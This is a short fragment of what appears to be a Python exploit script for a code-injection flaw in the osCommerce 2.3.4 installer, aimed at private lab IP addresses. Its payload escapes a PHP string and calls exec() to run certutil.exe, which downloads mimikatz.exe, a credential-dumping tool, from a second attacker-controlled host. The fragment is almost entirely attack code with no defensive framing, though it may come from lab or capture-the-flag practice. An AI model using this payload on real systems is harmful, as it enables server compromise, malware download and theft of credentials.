...
base_url = "http://10.10.127.207:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.127.207:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
...
payload = '\');'
payload += 'exec("certutil.exe -urlcache -f http://10.17.50.216:8080/mimikatz.exe mimikatz.exe");'    # this is where you enter you PHP payload
payload += '/*'
